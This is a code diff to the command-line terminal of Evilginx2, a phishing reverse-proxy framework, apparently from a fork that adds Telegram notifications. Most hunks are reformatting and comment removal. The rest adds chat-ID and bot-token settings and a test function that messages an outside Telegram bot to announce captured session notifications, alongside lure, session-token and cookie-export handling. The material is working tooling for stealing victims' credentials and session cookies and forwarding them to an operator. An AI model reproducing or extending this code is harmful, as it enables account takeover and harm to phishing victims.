@@ -17,6 +17,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
 	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -196,78 +197,75 @@ func (t *Terminal) handleConfig(args []string) error {
 		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetStripHeadersStatus(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
-	    } else if pn == 2 {
-        switch args[0] {
-        case "domain":
-            t.cfg.SetBaseDomain(args[1])
-            t.cfg.ResetAllSites()
-            t.manageCertificates(false)
-            return nil
-        case "ipv4":
-            t.cfg.SetServerExternalIP(args[1])
-            return nil
-        case "unauth_url":
-            if len(args[1]) > 0 {
-                _, err := url.ParseRequestURI(args[1])
-                if err != nil {
-                    return err
-                }
-            }
-            t.cfg.SetUnauthUrl(args[1])
-            return nil
-        case "autocert":
-            switch args[1] {
-            case "on":
-                t.cfg.EnableAutocert(true)
-                t.manageCertificates(true)
-                return nil
-            case "off":
-                t.cfg.EnableAutocert(false)
-                t.manageCertificates(true)
-                return nil
-            }
-        case "chatid":
-            t.cfg.SetChatid(args[1])
-            return nil
-        case "teletoken":
-            t.cfg.SetTeletoken(args[1])
-            return nil
-
-        case "strip_headers":
-            switch args[1] {
-            case "on":
-                t.cfg.SetStripHeaders(true)
-                return nil
-            case "off":
-                t.cfg.SetStripHeaders(false)
-                return nil
-            }
-
-        case "gophish":
-            switch args[1] {
-            case "test":
-                t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
-                err := t.p.gophish.Test()
-                if err != nil {
-                    log.Error("gophish: %s", err)
-                } else {
-                    log.Success("gophish: connection successful")
-                }
-                return nil
-            }
-
-			case "telegram":
-    switch args[1] {
-    case "test":
-        err := t.testTelegram()
-        if err != nil {
-            log.Error("telegram: %v", err)
-        } else {
-            log.Success("telegram: notification sent successfully!")
-        }
-        return nil
-    }
-        }
+	} else if pn == 2 {
+		switch args[0] {
+		case "domain":
+			t.cfg.SetBaseDomain(args[1])
+			t.cfg.ResetAllSites()
+			t.manageCertificates(false)
+			return nil
+		case "ipv4":
+			t.cfg.SetServerExternalIP(args[1])
+			return nil
+		case "unauth_url":
+			if len(args[1]) > 0 {
+				_, err := url.ParseRequestURI(args[1])
+				if err != nil {
+					return err
+				}
+			}
+			t.cfg.SetUnauthUrl(args[1])
+			return nil
+		case "autocert":
+			switch args[1] {
+			case "on":
+				t.cfg.EnableAutocert(true)
+				t.manageCertificates(true)
+				return nil
+			case "off":
+				t.cfg.EnableAutocert(false)
+				t.manageCertificates(true)
+				return nil
+			}
+		case "chatid":
+			t.cfg.SetChatid(args[1])
+			return nil
+		case "teletoken":
+			t.cfg.SetTeletoken(args[1])
+			return nil
+		case "strip_headers":
+			switch args[1] {
+			case "on":
+				t.cfg.SetStripHeaders(true)
+				return nil
+			case "off":
+				t.cfg.SetStripHeaders(false)
+				return nil
+			}
+		case "gophish":
+			switch args[1] {
+			case "test":
+				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
+				err := t.p.gophish.Test()
+				if err != nil {
+					log.Error("gophish: %s", err)
+				} else {
+					log.Success("gophish: connection successful")
+				}
+				return nil
+			}
+		case "telegram":
+			switch args[1] {
+			case "test":
+				err := t.testTelegram()
+				if err != nil {
+					log.Error("telegram: %v", err)
+				} else {
+					log.Success("telegram: notification sent successfully!")
+				}
+				return nil
+			}
+		}
 	} else if pn == 3 {
 		switch args[0] {
 		case "ipv4":
@@ -448,7 +446,6 @@ func (t *Terminal) handleSessions(args []string) error {
 		log.Printf("\n%s\n", AsTable(cols, rows))
 		return nil
 	} else if pn == 1 {
-		log.Printf("starting")
 		id, err := strconv.Atoi(args[0])
 		if err != nil {
 			return err
@@ -494,8 +491,6 @@ func (t *Terminal) handleSessions(args []string) error {
 
 				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
 					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-						//var str_tokens string
-
 						tkeys := []string{}
 						tvals := []string{}
 
@@ -738,7 +733,6 @@ func (t *Terminal) handleLures(args []string) error {
 	yellow := color.New(color.FgYellow)
 	higreen := color.New(color.FgHiGreen)
 	green := color.New(color.FgGreen)
-	//hiwhite := color.New(color.FgHiWhite)
 	hcyan := color.New(color.FgHiCyan)
 	cyan := color.New(color.FgCyan)
 	dgray := color.New(color.FgHiBlack)
@@ -747,7 +741,6 @@ func (t *Terminal) handleLures(args []string) error {
 	pn := len(args)
 
 	if pn == 0 {
-		// list lures
 		t.output("%s", t.sprintLures())
 		return nil
 	}
@@ -839,7 +832,6 @@ func (t *Terminal) handleLures(args []string) error {
 						}
 
 					} else {
-						// params present
 						for n := 2; n < pn; n++ {
 							val := args[n]
 
@@ -866,7 +858,7 @@ func (t *Terminal) handleLures(args []string) error {
 					var params_row string
 					var params string
 					if len(phish_params) > 0 {
-						params_row := phish_params[n]
+						params_row = phish_params[n]
 						m := 0
 						for k, v := range params_row {
 							if m > 0 {
@@ -1195,11 +1187,11 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
-    readline.PcItem("chatid"), readline.PcItem("teletoken"),
-    readline.PcItem("strip_headers", readline.PcItem("on"), readline.PcItem("off")),
-    readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
-    readline.PcItem("telegram", readline.PcItem("test")))
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("chatid"), readline.PcItem("teletoken"),
+			readline.PcItem("strip_headers", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+			readline.PcItem("telegram", readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -1326,9 +1318,6 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 			}
 			if domain[:1] == "." {
 				c.HostOnly = false
-				// c.Domain = domain[1:] - bug support no longer needed
-				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
-				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
 			} else {
 				c.HostOnly = true
 			}
@@ -1365,9 +1354,6 @@ func (t *Terminal) manageCertificates(verbose bool) {
 	if !t.p.developer {
 		if t.cfg.IsAutocertEnabled() {
 			hosts := t.p.cfg.GetActiveHostnames("")
-			//wc_host := t.p.cfg.GetWildcardHostname()
-			//hosts := []string{wc_host}
-			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
 			if verbose {
 				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
 			}
@@ -1473,7 +1459,6 @@ func (t *Terminal) sprintLures() string {
 	cyan := color.New(color.FgCyan)
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
-	//n := 0
 	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "redirect_url", "paused", "og"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
@@ -1540,54 +1525,49 @@ func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
 	return ret
 }
 
-
 func (t *Terminal) testTelegram() error {
-    chatid := t.cfg.general.Chatid
-    teletoken := t.cfg.general.Teletoken
+	chatid := t.cfg.general.Chatid
+	teletoken := t.cfg.general.Teletoken
 
-    if chatid == "" {
-        return fmt.Errorf("Telegram chat ID is not set. Use: config chatid <your_chat_id>")
-    }
-    if teletoken == "" {
-        return fmt.Errorf("Telegram bot token is not set. Use: config teletoken <your_bot_token>")
-    }
+	if chatid == "" {
+		return fmt.Errorf("Telegram chat ID is not set. Use: config chatid <your_chat_id>")
+	}
+	if teletoken == "" {
+		return fmt.Errorf("Telegram bot token is not set. Use: config teletoken <your_bot_token>")
+	}
 
-    // Validate the config
-    if err := t.cfg.ValidateTelegramConfig(); err != nil {
-        return err
-    }
+	if err := t.cfg.ValidateTelegramConfig(); err != nil {
+		return err
+	}
 
-    log.Info("telegram: sending test message...")
+	log.Info("telegram: sending test message...")
 
-    // Create a simple test message
-    message := "🚀 *Evilginx2 Telegram Notification Test*\n\n"
-    message += "✅ Your Telegram bot is working correctly!\n"
-    message += "📡 You will receive session notifications here.\n\n"
-    message += "`Test message sent at: " + time.Now().Format("2006-01-02 15:04:05") + "`\n"
-    message += "\\#Evilginx2 \\#TelegramEdition"
+	message := "\U0001f680 *Evilginx2 Telegram Notification Test*\n\n"
+	message += "\u2705 Your Telegram bot is working correctly!\n"
+	message += "\U0001f4e1 You will receive session notifications here.\n\n"
+	message += "`Test message sent at: " + time.Now().Format("2006-01-02 15:04:05") + "`\n"
+	message += "\\#Evilginx2 \\#TelegramEdition"
 
-    // Use the original sendTelegramNotification but without a file
-    // We'll use a simpler method
-    bot, err := tgbotapi.NewBotAPI(teletoken)
-    if err != nil {
-        return fmt.Errorf("failed to create Telegram bot: %v", err)
-    }
+	bot, err := tgbotapi.NewBotAPI(teletoken)
+	if err != nil {
+		return fmt.Errorf("failed to create Telegram bot: %v", err)
+	}
 
-    chatIDInt, err := strconv.ParseInt(chatid, 10, 64)
-    if err != nil {
-        return fmt.Errorf("invalid chat ID format: %v", err)
-    }
+	chatIDInt, err := strconv.ParseInt(chatid, 10, 64)
+	if err != nil {
+		return fmt.Errorf("invalid chat ID format: %v", err)
+	}
 
-    msg := tgbotapi.NewMessage(chatIDInt, message)
-    msg.ParseMode = "MarkdownV2"
-    msg.DisableWebPagePreview = true
+	msg := tgbotapi.NewMessage(chatIDInt, message)
+	msg.ParseMode = "MarkdownV2"
+	msg.DisableWebPagePreview = true
 
-    _, err = bot.Send(msg)
-    if err != nil {
-        return fmt.Errorf("failed to send test message: %v", err)
-    }
+	_, err = bot.Send(msg)
+	if err != nil {
+		return fmt.Errorf("failed to send test message: %v", err)
+	}
 
-    return nil
+	return nil
 }
 
 func (t *Terminal) luresIdPrefixCompleter(args string) []string {
@@ -1626,7 +1606,6 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 		for fs.Scan() {
 			n += 1
 			l := fs.Text()
-			// remove comments
 			if n := strings.Index(l, ";"); n > -1 {
 				l = l[:n]
 			}
@@ -1718,35 +1697,6 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				ret_params = append(ret_params, map_params)
 			}
 		}
-
-		/*
-			r := json.NewDecoder(bufio.NewReader(f))
-
-			t, err := r.Token()
-			if err != nil {
-				return ret, ret_params, err
-			}
-			if s, ok := t.(string); ok && s == "[" {
-				for r.More() {
-					t, err := r.Token()
-					if err != nil {
-						return ret, ret_params, err
-					}
-
-					if s, ok := t.(string); ok && s == "{" {
-						for r.More() {
-							t, err := r.Token()
-							if err != nil {
-								return ret, ret_params, err
-							}
-
-
-						}
-					}
-				}
-			} else {
-				return ret, ret_params, fmt.Errorf("array of parameters not found")
-			}*/
 	}
 	return ret, ret_params, nil
 }
@@ -1882,7 +1832,6 @@ func (t *Terminal) sprintVar(k string, v string) string {
 
 func (t *Terminal) filterInput(r rune) (rune, bool) {
 	switch r {
-	// block CtrlZ feature
 	case readline.CharCtrlZ:
 		return r, false
 	}
